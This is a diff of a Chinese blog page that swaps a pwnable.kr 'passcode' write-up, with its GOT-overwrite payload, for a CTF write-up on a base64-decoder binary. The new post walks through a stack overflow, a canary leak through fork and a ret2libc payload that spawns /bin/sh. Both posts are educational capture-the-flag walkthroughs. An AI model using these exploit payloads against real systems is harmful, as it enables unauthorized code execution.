@@ -4,24 +4,26 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>pwnable.kr之passcode | Reshahar的博客</title>
+    <title>hxb的pwn1 | Reshahar的博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="Reshahar">
     
 
     
-    <meta name="description" content="pwnable.kr 上的第五道题">
-<meta name="keywords" content="pwn,pwnable.kr">
+    <meta name="description" content="hxb的pwn1">
+<meta name="keywords" content="pwn,栈溢出,stack canary">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.kr之passcode">
-<meta property="og:url" content="http://Reshahar.github.io/2017/05/27/pwnable-kr-passcode/index.html">
+<meta property="og:title" content="hxb的pwn1">
+<meta property="og:url" content="http://Reshahar.github.io/2017/12/05/hxb的pwn1/index.html">
 <meta property="og:site_name" content="Reshahar的博客">
-<meta property="og:description" content="pwnable.kr 上的第五道题">
-<meta property="og:updated_time" content="2017-05-30T14:24:38.000Z">
+<meta property="og:description" content="hxb的pwn1">
+<meta property="og:image" content="http://reshahar.github.io/img/hxb/pwn1/01.png">
+<meta property="og:updated_time" content="2017-12-05T01:53:53.771Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.kr之passcode">
-<meta name="twitter:description" content="pwnable.kr 上的第五道题">
+<meta name="twitter:title" content="hxb的pwn1">
+<meta name="twitter:description" content="hxb的pwn1">
+<meta name="twitter:image" content="http://reshahar.github.io/img/hxb/pwn1/01.png">
 
     
     <link rel="alternative" href="/atom.xml" title="Reshahar的博客" type="application/atom+xml">
@@ -82,14 +84,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2017/05/27/pwnable-kr-passcode/" title="pwnable.kr之passcode" itemprop="url">pwnable.kr之passcode</a>
+      <a href="/2017/12/05/hxb的pwn1/" title="hxb的pwn1" itemprop="url">hxb的pwn1</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/" title="Reshahar" target="_blank" itemprop="author">Reshahar</a>
 		
   <p class="article-time">
-    <time datetime="2017-05-27T15:11:46.000Z" itemprop="datePublished"> 发表于 2017-05-27</time>
+    <time datetime="2017-12-05T01:10:50.000Z" itemprop="datePublished"> 发表于 2017-12-05</time>
       
      &nbsp
      <span id="busuanzi_container_page_pv" style="display:none">
@@ -103,165 +105,239 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-分析"><span class="toc-number">1.</span> <span class="toc-text">0x00 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-总结"><span class="toc-number">2.</span> <span class="toc-text">0x01 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-参考"><span class="toc-number">3.</span> <span class="toc-text">0x02 参考</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-题目分析"><span class="toc-number">1.</span> <span class="toc-text">0x00 题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-漏洞分析和利用"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞分析和利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-总结"><span class="toc-number">3.</span> <span class="toc-text">0x03 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-参考资料"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考资料</span></a></li></ol>
 		
 		</div>
 		
-		<p>pwnable.kr 上的第五道题</p>
+		<p>hxb的pwn1</p>
 <hr>
 <a id="more"></a>
-<h3 id="0x00-分析"><a href="#0x00-分析" class="headerlink" title="0x00 分析"></a>0x00 分析</h3><p>首先 ssh passcode@pwnable.kr -p2222 连上去，也可以用Xshell，查看目录文件和代码内容</p>
-<pre><code>passcode@ubuntu:~$ ls
-flag  passcode    passcode.c
-passcode@ubuntu:~$ cat passcode.c 
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
+<h3 id="0x00-题目分析"><a href="#0x00-题目分析" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h3><p>首先IDA分析题目</p>
+<pre><code>int __cdecl main()
+{
+  char v1; // [esp+1Bh] [ebp-5h]
+  __pid_t v2; // [esp+1Ch] [ebp-4h]
 
-void login(){
-    int passcode1;
-    int passcode2;
-
-    printf(&quot;enter passcode1 : &quot;);
-    scanf(&quot;%d&quot;, passcode1);
-    fflush(stdin);
-
-    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
-    printf(&quot;enter passcode2 : &quot;);
-        scanf(&quot;%d&quot;, passcode2);
-
-    printf(&quot;checking...\n&quot;);
-    if(passcode1==338150 &amp;&amp; passcode2==13371337){
-                printf(&quot;Login OK!\n&quot;);
-                system(&quot;/bin/cat flag&quot;);
-        }
-        else{
-                printf(&quot;Login Failed!\n&quot;);
+  setbuf(stdin, 0);
+  setbuf(stdout, 0);
+  setbuf(stderr, 0);
+  puts(&quot;I am a simple program&quot;);
+  while ( 1 )
+  {
+    puts(&quot;\nMay be I can know if you give me some data[Y/N]&quot;);
+    if ( getchar() != &apos;Y&apos; )
+      break;
+    v1 = getchar();
+    while ( v1 != 10 &amp;&amp; v1 )
+      ;
+    v2 = fork();
+    if ( !v2 )
+    {
+      sub_8048B29();
+      puts(&quot;Finish!&quot;);
+      exit(0);
+    }
+    if ( v2 &lt;= 0 )
+    {
+      if ( v2 == -1 )
+      {
+        puts(&quot;Something Wrong&quot;);
         exit(0);
-        }
+      }
+    }
+    else
+    {
+      wait(0);
+    }
+  }
+  return 0;
 }
+</code></pre><p>程序的主要逻辑，fork执行函数sub_8048B29，再来看一下sub_8048B29</p>
+<pre><code>unsigned int sub_80487E6()
+{
+  char *v0; // edx
+  unsigned int v1; // ebx
+  char *v2; // edi
+  char *v3; // edx
+  int v4; // eax
+  int v5; // eax
+  int v6; // eax
+  unsigned __int8 i; // [esp+17h] [ebp-121h]
+  unsigned __int8 j; // [esp+17h] [ebp-121h]
+  unsigned __int8 k; // [esp+17h] [ebp-121h]
+  unsigned __int8 l; // [esp+17h] [ebp-121h]
+  int ii; // [esp+18h] [ebp-120h]
+  int v13; // [esp+1Ch] [ebp-11Ch]
+  int v14; // [esp+1Ch] [ebp-11Ch]
+  int v15; // [esp+1Ch] [ebp-11Ch]
+  char *input; // [esp+20h] [ebp-118h]
+  unsigned __int8 s; // [esp+27h] [ebp-111h]
+  unsigned __int8 v18; // [esp+28h] [ebp-110h]
+  unsigned __int8 v19; // [esp+29h] [ebp-10Fh]
+  unsigned __int8 v20; // [esp+2Ah] [ebp-10Eh]
+  char base64_result[257]; // [esp+2Bh] [ebp-10Dh]
+  unsigned int v22; // [esp+12Ch] [ebp-Ch]
 
-void welcome(){
-    char name[100];
-    printf(&quot;enter you name : &quot;);
-    scanf(&quot;%100s&quot;, name);
-    printf(&quot;Welcome %s!\n&quot;, name);
+  v22 = __readgsdword(0x14u);
+  input = (char *)malloc(0x201u);
+  v0 = base64_result;
+  v1 = 0x101;
+  if ( (unsigned int)base64_result &amp; 1 )
+  {
+    base64_result[0] = 0;
+    v0 = &amp;base64_result[1];
+    v1 = 256;
+  }
+  if ( (unsigned __int8)v0 &amp; 2 )
+  {
+    *(_WORD *)v0 = 0;
+    v0 += 2;
+    v1 -= 2;
+  }
+  memset(v0, 0, 4 * (v1 &gt;&gt; 2));
+  v2 = &amp;v0[4 * (v1 &gt;&gt; 2)];
+  v3 = &amp;v0[4 * (v1 &gt;&gt; 2)];
+  if ( v1 &amp; 2 )
+  {
+    *(_WORD *)v2 = 0;
+    v3 = v2 + 2;
+  }
+  if ( v1 &amp; 1 )
+    *v3 = 0;
+  read_80486FD(input, 0x200u);
+  ii = 0;
+  v13 = 0;
+  while ( input[ii] )
+  {
+    memset(&amp;s, 255, 4u);
+    for ( i = 0; i &lt;= 0x3Fu; ++i )
+    {
+      if ( base64_804A050[i] == input[ii] )
+        s = i;
+    }
+    for ( j = 0; j &lt;= 0x3Fu; ++j )
+    {
+      if ( base64_804A050[j] == input[ii + 1] )
+        v18 = j;
+    }
+    for ( k = 0; k &lt;= 0x3Fu; ++k )
+    {
+      if ( base64_804A050[k] == input[ii + 2] )
+        v19 = k;
+    }
+    for ( l = 0; l &lt;= 0x3Fu; ++l )
+    {
+      if ( base64_804A050[l] == input[ii + 3] )
+        v20 = l;
+    }
+    v4 = v13;
+    v14 = v13 + 1;
+    base64_result[v4] = (v18 &gt;&gt; 4) &amp; 3 | 4 * s;
+    if ( input[ii + 2] == &apos;=&apos; )
+      break;
+    v5 = v14;
+    v15 = v14 + 1;
+    base64_result[v5] = (v19 &gt;&gt; 2) &amp; 0xF | 16 * v18;
+    if ( input[ii + 3] == &apos;=&apos; )
+      break;
+    v6 = v15;
+    v13 = v15 + 1;
+    base64_result[v6] = v20 &amp; 0x3F | (v19 &lt;&lt; 6);
+    ii += 4;
+  }
+  printf(&quot;Result is:%s\n&quot;, base64_result);
+  return __readgsdword(0x14u) ^ v22;
 }
+</code></pre><p>上面函数的主要功能就是解密base64，漏洞点如下：</p>
+<pre><code>1.read_80486FD(input, 0x200u);
+在输入0x200的base64字符串，解密之后的大小为0x200/4*3 = 0x180
+2.char base64_result[257]; // [esp+2Bh] [ebp-10Dh]
+解密结果缓冲区的大小为0x101,这会发生栈溢出
+</code></pre><h3 id="0x01-漏洞分析和利用"><a href="#0x01-漏洞分析和利用" class="headerlink" title="0x01 漏洞分析和利用"></a>0x01 漏洞分析和利用</h3><pre><code> 我们要解决的问题，Canary保护，这个很重要否则栈溢出会失败，这里有几个点需要了解
 
-int main(){
-    printf(&quot;Toddler&apos;s Secure Login System 1.0 beta.\n&quot;);
+1.fork进程的调试，如何跟踪子进程和父进程    
+2.fork的子进程和父进程之间的资源共享，所以我们通过一次合适溢出将canary的leak出（最后会打印base64结果），然后下一次溢出劫持控制流
+3.怎么样获取system地址，启动shell
 
-    welcome();
-    login();
 
-    // something after login...
-    printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);
-    return 0;    
-}
-</code></pre><p>由上面的代码可以看出scanf少了&amp;,这里输入数字会产生崩溃（在没有取地址的时候，程序会在栈上去数据作为地址），看是我认为是将后面的int认为是char[]这样就可以不用取地址了，但是调试后发现并不正确，最后将目光转到welcome函数，我尝试着输入十次0-9的数字，看看他有没有溢出的或者其他的因为login函数里scanf的参数是在栈上的会不会可以覆盖，但是由于对gdb-peda插件的栈中内容没有看懂，误以为栈上的数据就是栈上值，实际栈上的地址，导致判断错了，覆盖的位置，但是判断出的是76，但实际这是栈地址，后来就没有思路了，最后还是上网上找了wp，读了才发现是哪里的问题</p>
-<p>调整思路重新调试，如下，首先在login函数下断点</p>
-<pre><code>gdb-peda$ pattern create 150 1.txt
-Writing pattern of 150 chars to filename &quot;1.txt&quot;
-gdb-peda$ b login 
-Breakpoint 1 at 0x8048531
-gdb-peda$ r &lt;1.txt 
-.....
-0x8048547 &lt;login+28&gt;:    push   0x8048713
-=&gt; 0x804854c &lt;login+33&gt;:    call   0x8048420 &lt;__isoc99_scanf@plt&gt;
-0x8048551 &lt;login+38&gt;:    add    esp,0x10
-0x8048554 &lt;login+41&gt;:    mov    eax,ds:0x8049a44
-0x8048559 &lt;login+46&gt;:    sub    esp,0xc
-0x804855c &lt;login+49&gt;:    push   eax
-Guessed arguments:
-arg[0]: 0x8048713 --&gt; 0x65006425 (&apos;%d&apos;)
-arg[1]: 0x4c414136 (&apos;6AAL&apos;)
-[------------------------------------stack-------------------------------------]
-0000| 0xffffd3e0 --&gt; 0x8048713 --&gt; 0x65006425 (&apos;%d&apos;)
-0004| 0xffffd3e4 (&quot;6AALAA4AAJAAfAA5AAKAAgAA6AAL&quot;)
-0008| 0xffffd3e8 (&quot;AA4AAJAAfAA5AAKAAgAA6AAL&quot;)
-0012| 0xffffd3ec (&quot;AJAAfAA5AAKAAgAA6AAL&quot;)
-0016| 0xffffd3f0 (&quot;fAA5AAKAAgAA6AAL&quot;)
-0020| 0xffffd3f4 (&quot;AAKAAgAA6AAL&quot;)
-0024| 0xffffd3f8 (&quot;AgAA6AAL&quot;)
-0028| 0xffffd3fc (&quot;6AAL&quot;)
-[------------------------------------------------------------------------------]
-Legend: code, data, rodata, value
-0x0804854c in login ()
-gdb-peda$ pattern offset 0x4c414136
-1279344950 found at offset: 96
-gdb-peda$
-</code></pre><p>通过peda插件的Guessed arguments:可以看到scanf的参数，这是之前没有注意到的，通过pattern确定偏移的，位置可以看到在name变量的96位就是scanf的第二个参数要写入的地址，所以可以将将输入的字符写到可以写入的地址，这里我试着将两个scanf的输入地址都改写，但是本地还是没有成功，wp中写在welcome中做了校验，但是我的没有，后来才发现，是编译选项写的不对，没有开启Stack Canary，开启Stack Canary后，name的长度就不能溢出了，否则程序会跳转到___stack_chk_fail函数执行</p>
-<pre><code>//Stack Canary 
-mov     eax, [ebp+var_C]
-xor     eax, large gs:14h
-jz      short locret_80486A2
-</code></pre><p>然后根据wp的思路是去改写got表，因为got是可写的，而且可以换劫持控制流</p>
-<p>首先，在本地看一下got表，使用readelf -r</p>
-<pre><code>root@kali:~/D/tmp/pwnable.kr-passcode# readelf -r ./passcode
+使用gdb调试fork，可以如下设置，这样会跟踪子进程
 
-Relocation section &apos;.rel.dyn&apos; at offset 0x32c contains 2 entries:
-Offset     Info    Type            Sym.Value  Sym. Name
-08049a0c  00000506 R_386_GLOB_DAT    00000000   __gmon_start__
-08049a44  00000a05 R_386_COPY        08049a44   stdin
+set follow-fork-mode chird
+set detach-on-fork off
+</code></pre><p>可以使用如下的命令完成父子进程的之前的切换</p>
+<pre><code>info inferiors  查看调试进程
+inferiors num     切换调试进程
+</code></pre><p>因为fork的子进程和父进程之间的资源共享，我们就可以构造泄露canary，我们首先使用pattern.py生成一个长度为0x180的畸形字符串，然后base64加密，具体如下</p>
+<pre><code>root@ubuntu:~/pwn# python pattern.py create 384
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7
 
-Relocation section &apos;.rel.plt&apos; at offset 0x33c contains 8 entries:
-Offset     Info    Type            Sym.Value  Sym. Name
-08049a1c  00000107 R_386_JUMP_SLOT   00000000   printf
-08049a20  00000207 R_386_JUMP_SLOT   00000000   fflush
-08049a24  00000307 R_386_JUMP_SLOT   00000000   puts
-08049a28  00000407 R_386_JUMP_SLOT   00000000   system
-08049a2c  00000507 R_386_JUMP_SLOT   00000000   __gmon_start__
-08049a30  00000607 R_386_JUMP_SLOT   00000000   exit
-08049a34  00000707 R_386_JUMP_SLOT   00000000   __libc_start_main
-08049a38  00000807 R_386_JUMP_SLOT   00000000   __isoc99_scanf
-</code></pre><p>源程序中，在scanf后调用了fflush，printf，exit 三个函数，任选其中一个函数修改成程序中调用system的地址，就能拿到flag</p>
-<pre><code>//调用system的地址
-.text:080485BA                 sub     esp, 0Ch
-.text:080485BD                 push    offset command  ; &quot;/bin/cat flag&quot;
-.text:080485C2                 call    _system
-.text:080485C7                 add     esp, 10h
-</code></pre><p>所以，综上上面说的将0x08049a1c(printf)得地址改成0x080485BD就行了，这里输入的是十进制0x080485BD==134514109</p>
-<p>本地测试如下，本地创建flag文件，内容1234567，可以看到查到flag了</p>
-<pre><code>root@kali:~/D/tmp/pwnable.kr-passcode# python -c &quot;print &apos;A&apos;*96+&apos;\x1c\x9a\x04\x08&apos;+&apos;\n&apos;+&apos;134514109&apos;+&apos;\n&apos;&quot;| ./passcode
-Toddler&apos;s Secure Login System 1.0 beta.
-enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!
-1234567
-enter passcode1 : Now I can safely trust you that you have credential :)
-</code></pre><p>远程我们要重新查看一下got表，以及调用system的地址，这个和不同环境有关，具体如下：</p>
-<pre><code>//查看got
-passcode@ubuntu:~$ readelf -r passcode
 
-Relocation section &apos;.rel.dyn&apos; at offset 0x388 contains 2 entries:
-Offset     Info    Type            Sym.Value  Sym. Name
-08049ff0  00000606 R_386_GLOB_DAT    00000000   __gmon_start__
-0804a02c  00000b05 R_386_COPY        0804a02c   stdin@GLIBC_2.0
 
-Relocation section &apos;.rel.plt&apos; at offset 0x398 contains 9 entries:
-Offset     Info    Type            Sym.Value  Sym. Name
-0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
-0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
-0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
-0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
-0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
-0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__
-0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
-0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
-0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
+[──────────────────────────────────REGISTERS───────────────────────────────────]
+*EAX  0x36694135 (&apos;5Ai6&apos;)
+ EBX  0x0
+*ECX  0xffffffff
+*EDX  0xf76ff870 (_IO_stdfile_1_lock) ◂— 0x0
+*EDI  0xffb14a6c ◂— 0x36694135 (&apos;5Ai6&apos;)
+*ESI  0xf76fe000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
+*EBP  0xffb14a78 ◂— 0x306a4139 (&apos;9Aj0&apos;)
+*ESP  0xffb14940 —▸ 0x8048d2a ◂— push   edx /* &apos;Result is:%s\n&apos; */
+*EIP  0x8048b11 ◂— xor    eax, dword ptr gs:[0x14]
+[────────────────────────────────────DISASM────────────────────────────────────]
+ ► 0x8048b11    xor    eax, dword ptr gs:[0x14]
+   0x8048b18    je     0x8048b1f
+    ↓
+   0x8048b1f    add    esp, 0x130
+   0x8048b25    pop    ebx
+   0x8048b26    pop    edi
+   0x8048b27    pop    ebp
+   0x8048b28    ret    
 
-//gdb 查看调用system地址
-0x080485e3 &lt;+127&gt;:    movl   $0x80487af,(%esp)
----Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
-0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;
-0x080485ef &lt;+139&gt;:    leave  
-</code></pre><p>经过计算最后payload如下：</p>
-<pre><code>python -c &quot;print &apos;A&apos;*96+&apos;\x00\xa0\x04\x08&apos;+&apos;\n&apos;+&apos;134514147&apos;+&apos;\n&apos;&quot;| ./passcode
-</code></pre><p>实际运行结果，拿下flag</p>
-<pre><code>passcode@ubuntu:~$ python -c &quot;print &apos;A&apos;*96+&apos;\x00\xa0\x04\x08&apos;+&apos;\n&apos;+&apos;134514147&apos;+&apos;\n&apos;&quot;| ./passcode
-Toddler&apos;s Secure Login System 1.0 beta.
-enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
-Sorry mom.. I got confused about scanf usage :(
-enter passcode1 : Now I can safely trust you that you have credential :)
-</code></pre><h3 id="0x01-总结"><a href="#0x01-总结" class="headerlink" title="0x01 总结"></a>0x01 总结</h3><p>通过这个题，知道了got表是什么样的，怎么重写，怎么利用这样的漏洞</p>
-<h3 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h3><p>[1]<a href="http://blog.csdn.net/qq_20307987/article/details/51303824" target="_blank" rel="external">http://blog.csdn.net/qq_20307987/article/details/51303824</a>  pwnable.kr之passcode</p>
+   0x8048b29    push   ebp
+   0x8048b2a    mov    ebp, esp
+   0x8048b2c    sub    esp, 8
+   0x8048b2f    call   0x80487e6
+[────────────────────────────────────STACK─────────────────────────────────────]
+00:0000│ esp  0xffb14940 —▸ 0x8048d2a ◂— push   edx /* &apos;Result is:%s\n&apos; */
+01:0004│      0xffb14944 —▸ 0xffb1496b ◂— 0x41306141 (&apos;Aa0A&apos;)
+02:0008│      0xffb14948 ◂— 0x4
+03:000c│      0xffb1494c —▸ 0xffb149c8 ◂— 0x41316441 (&apos;Ad1A&apos;)
+04:0010│      0xffb14950 —▸ 0xffb14a10 ◂— 0x41356641 (&apos;Af5A&apos;)
+05:0014│      0xffb14954 ◂— 0x4072db6b
+06:0018│      0xffb14958 ◂— 0x200
+07:001c│      0xffb1495c ◂— 0x180
+[──────────────────────────────────BACKTRACE───────────────────────────────────]
+ ► f 0  8048b11
+   f 1 41316a41
+   f 2 6a41326a
+   f 3 346a4133
+   f 4 41356a41
+   f 5 6a41366a
+   f 6 386a4137
+   f 7 41396a41
+   f 8 6b41306b
+   f 9 326b4131
+   f 10 41336b41
+Breakpoint *0x08048B11
+pwndbg&gt; 
+</code></pre><p>这时候的eax寄存器中的值就是Canary的值，我们使用pattern.py计算一下偏移，具体如下</p>
+<pre><code>root@ubuntu:~/pwn# python pattern.py offset 5Ai6
+257
+</code></pre><p>这里要加1因为Canary的最高位的值是\x00，打印的时候会截断，不会输出后面的Canary</p>
+<p>下面我们就可以通过同样的方法，找到返回地址的偏移，我在这里就不详细说明了，返回地址的偏移是273</p>
+<p>下面就可以正式编辑exp了，现在我们可以控制返回地址，下面我们就可以填充shellcode了，但是由于程序开启的NX，所以我们要使用ret2libc技术，首先我们要获取system函数地址，具体构造如下</p>
+<pre><code>pay = &quot;P&quot;*257+p32(canary)+&quot;p&quot;*12+p32(put_plt)+p32(0xffffffff)+p32(fork_got)
+</code></pre><p>这样可以将fork函数的地址打印出来，然后我们可以通过如下计算获取到system_addr和binsh_addr。</p>
+<pre><code>system_addr = fork_addr - libc.symbols[&apos;fork&apos;]+libc.symbols[&apos;system&apos;]
+binsh_addr = fork_addr - libc.symbols[&apos;fork&apos;]+next(libc.search(&quot;/bin/sh\x00&quot;))
+</code></pre><p>最后按照上面的pay可以构造执行system（”/bin/sh”），具体如下：</p>
+<pre><code>payload = &quot;P&quot;*257+p32(canary)+&quot;P&quot;*12+p32(system_addr)+p32(0xffffffff)+p32(binsh_addr)
+</code></pre><p>最后即可拿到shell，结果如下图：</p>
+<p><img src="/img/hxb/pwn1/01.png" alt=""></p>
+<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>这道题让我们主要学习的到有以下两点</p>
+<pre><code>1.怎么是用gdb调试多线程fork
+2.怎么绕过canary完成栈溢出
+</code></pre><h3 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h3><p><a href="http://blog.csdn.net/pbymw8iwm/article/details/7876797" target="_blank" rel="external">gdb调试多进程和多线程命令</a></p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -275,7 +351,7 @@ enter passcode1 : Now I can safely trust you that you have credential :)
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/pwnable-kr/">pwnable.kr</a>
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/栈溢出/">栈溢出</a><a href="/tags/stack-canary/">stack canary</a>
   </div>
 
 </div>
@@ -284,7 +360,7 @@ enter passcode1 : Now I can safely trust you that you have credential :)
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://Reshahar.github.io/2017/05/27/pwnable-kr-passcode/" data-title="pwnable.kr之passcode | Reshahar的博客" data-tsina="null" class="share clearfix">
+	  <div data-url="http://Reshahar.github.io/2017/12/05/hxb的pwn1/" data-title="hxb的pwn1 | Reshahar的博客" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -298,21 +374,13 @@ enter passcode1 : Now I can safely trust you that you have credential :)
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/2017/05/26/pwnable-kr-flag/" title="pwnable.kr之flag">
+ <a href="/2017/06/01/胖哈勃杯第十三届CUIT校赛-re150/" title="胖哈勃杯第十三届CUIT校赛之re150">
   <strong>上一篇：</strong><br/>
   <span>
-  pwnable.kr之flag</span>
+  胖哈勃杯第十三届CUIT校赛之re150</span>
 </a>
 </div>
 
-
-<div class="next">
-<a href="/2017/05/30/胖哈勃杯第十三届CUIT校赛-re100/"  title="胖哈勃杯第十三届CUIT校赛之re100">
- <strong>下一篇：</strong><br/> 
- <span>胖哈勃杯第十三届CUIT校赛之re100
-</span>
-</a>
-</div>
 
 </nav>
 
@@ -324,7 +392,7 @@ enter passcode1 : Now I can safely trust you that you have credential :)
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-分析"><span class="toc-number">1.</span> <span class="toc-text">0x00 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-总结"><span class="toc-number">2.</span> <span class="toc-text">0x01 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-参考"><span class="toc-number">3.</span> <span class="toc-text">0x02 参考</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-题目分析"><span class="toc-number">1.</span> <span class="toc-text">0x00 题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-漏洞分析和利用"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞分析和利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-总结"><span class="toc-number">3.</span> <span class="toc-text">0x03 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-参考资料"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考资料</span></a></li></ol>
  
   </div>
 
